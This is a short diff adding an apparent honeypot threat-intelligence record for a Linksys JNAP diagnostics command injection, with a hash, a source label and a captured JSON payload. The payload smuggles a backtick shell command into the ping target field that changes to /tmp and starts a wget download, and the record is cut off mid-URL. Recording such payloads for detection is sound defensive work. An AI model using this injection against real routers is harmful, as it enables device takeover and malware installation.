@@ -1,0 +1,5 @@
+SHA256: 2cd418902688de219bb72a3e427cbcf93deb0e19ca324ae9d6ae16d814eec359
+Pattern: Linksys JNAP diagnostics command injection
+Evidence source: T-Pot inbound payload
+
+{"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd /tmp;wget htt
